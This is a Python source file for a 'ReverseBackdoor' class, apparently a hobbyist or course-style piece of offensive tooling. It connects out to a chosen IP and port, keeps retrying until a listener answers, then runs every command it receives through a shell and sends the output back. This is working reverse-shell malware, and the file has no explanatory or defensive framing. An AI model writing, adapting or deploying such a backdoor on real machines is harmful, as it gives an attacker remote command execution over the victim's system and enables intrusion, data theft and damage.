#!usr/bin/env python3
import socket
import subprocess
import json
import sys

class ReverseBackdoor:
	def __init__(self, ip:str, port:int)->None:
		self.port = port 
		self.ip = ip

		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connect_to_listener()
	

	def connect_to_listener(self):
		connected = False
		while not connected:
			try:
				self.connection.connect((self.ip,self.port))
				connected = True
				print('\r[*] Connection Established.')
			except ConnectionRefusedError:
				print('\r[-] Connection Refused.', end='')


	def serial_send(self, data:str or list):
		'''
		serialize data and send over TCP socket.
		'''
		bytes_json_data = json.dumps(data).encode('utf-8')
		# print('Backdoor sent: ',bytes_json_data)
		self.connection.send(bytes_json_data)


	def serial_receive(self) -> str :
		'''
        receive serialized data over TCP socket
        and retrieve original data.
		'''
		bytes_json_data = b''
		while True:
			try:
				bytes_json_data += self.connection.recv(1024)
				data = json.loads(bytes_json_data)
				# print("Backdoor Rec: ", data)
				return data 
			except json.JSONDecodeError:
				continue


	def execute_command(self,command:str)->str:
		'''
		executes command and return command's output.
		'''
		return subprocess.check_output(command, shell=True).decode('utf-8')


	def run(self):
		while True:
			try:
				command = self.serial_receive()
				
				# remove below line
				command_lst = command.split(' ')
				if command_lst[0] == 'exit':
					self.connection.close()
					sys.exit()

				command_output = self.execute_command(command)
				self.serial_send(command_output)

			except json.JSONDecodeError:
				print('[-] Lost Connection.')
				self.connect_to_listener()

			except Exception as e:
				exception = ('[-] Exception : ' + str(e))
				self.serial_send(exception)

